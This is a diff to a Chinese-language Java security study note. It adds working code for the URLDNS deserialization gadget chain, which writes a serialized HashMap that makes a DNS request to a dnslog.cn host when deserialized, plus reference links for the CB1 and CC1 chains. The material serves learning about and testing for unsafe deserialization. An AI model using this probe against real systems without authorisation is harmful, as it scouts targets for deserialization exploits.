@@ -154,8 +154,68 @@ Thymeleaf、Velocity、FreeMarker
 	- 中间件不同的 jndi 注入
 	- jar 包依赖不同的 jndi 注入
 
+### URLDNSlog 链
 
-> DNSlog 链
+> Java 的 URL 类在计算 hashCode 时，认为“逻辑上等价的 URL 应该有相同的哈希值”，为判断两个域名是否指向同一个地方，Java 会在 URLStreamHandler 中调用网络解析库去查询该域名的 IP 地址。
+
+![[attachments/20260122.png]]
+
+```java
+public static void main(String[] args) throws MalformedURLException {
+
+    URL url = new URL("http://e2pnia.dnslog.cn");
+    HashMap hashMap = new HashMap();
+
+    hashMap.put(url, 1);
+}
+```
+
+本地构造 POC 时不发送网络请求，通过反射修改 URL 类中的 hashCode，将其不等于 -1 即可：
+
+生成 POC 到本地磁盘
+
+```java
+public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+    HashMap<URL, String> hashMap = new HashMap<>();
+    URL url = new URL("http://e2pnia.dnslog.cn");
+    Field hashCode = url.getClass().getDeclaredField("hashCode");
+    hashCode.setAccessible(true);
+    hashCode.set(url, 0);
+    hashMap.put(url, 1); // put 进去时, hashCode 为 0, 在里面调用 hashCode 方法, 不会发送DNSLOG请求.
+    hashCode.set(url, -1); // put 完了, 再改回 -1, 以免我们序列化的 hashCode 被替换为 0. 下一次反序列化时就会发送 DNSLOG 请求.
+    serialize(hashMap); // 运行后 D:/heihu577.ser 将生成出来
+}
+
+public static void serialize(Object o) throws IOException {
+    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));
+    oos.writeObject(o);
+}
+```
+
+反序列化调用：
+
+```java
+public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+    unserialize(); // 调用直接发送 DNSLOG 请求.
+}
+
+public static Map unserialize() throws IOException, ClassNotFoundException {
+    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("dns.txt"));
+    return (Map) ois.readObject();
+}
+```
+
+> URLDNSlog 链
 > 
 > https://mp.weixin.qq.com/s/9rS6iPMkxLHECgGDdyGXsQ
 > https://mp.weixin.qq.com/s/synx7l2JjZAtd9UHtXVqng
+
+### CB1 链
+
+> https://www.freebuf.com/articles/web/319397.html
+
+![[attachments/20260122-1.png]]
+
+## CC1 链
+
+> https://mp.weixin.qq.com/s/J_YeNkLN6KYTCVDYFh1dvQ
